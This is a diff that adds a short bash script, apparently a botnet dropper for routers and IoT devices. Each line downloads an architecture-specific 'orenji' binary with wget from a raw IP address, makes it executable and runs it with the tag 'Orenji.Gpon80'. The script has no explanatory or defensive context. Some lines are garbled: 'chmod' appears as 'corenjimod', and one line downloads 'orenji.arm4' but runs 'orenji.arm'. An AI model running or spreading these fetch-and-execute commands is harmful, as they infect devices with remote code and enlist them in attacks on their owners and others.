@@ -1,0 +1,11 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.93.34.145/wrgjwrgjwrg246356356356/orenji.x86;  corenjimod +x *;./orenji.x86 Orenji.Gpon80
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.93.34.145/wrgjwrgjwrg246356356356/orenji.mips; corenjimod +x *;./orenji.mips Orenji.Gpon80
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.93.34.145/wrgjwrgjwrg246356356356/orenji.mpsl; corenjimod +x *;./orenji.mpsl Orenji.Gpon80
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.93.34.145/wrgjwrgjwrg246356356356/orenji.arm4; corenjimod +x *;./orenji.arm Orenji.Gpon80
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.93.34.145/wrgjwrgjwrg246356356356/orenji.arm5; corenjimod +x *;./orenji.arm5 Orenji.Gpon80
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.93.34.145/wrgjwrgjwrg246356356356/orenji.arm6; corenjimod +x *;./orenji.arm6 Orenji.Gpon80
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.93.34.145/wrgjwrgjwrg246356356356/orenji.arm7; corenjimod +x *;./orenji.arm7 Orenji.Gpon80
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.93.34.145/wrgjwrgjwrg246356356356/orenji.ppc; corenjimod +x *;./orenji.ppc Orenji.Gpon80
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.93.34.145/wrgjwrgjwrg246356356356/orenji.m68k; corenjimod +x *;./orenji.m68k Orenji.Gpon80
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://142.93.34.145/wrgjwrgjwrg246356356356/orenji.spc; corenjimod +x *;./orenji.spc Orenji.Gpon80
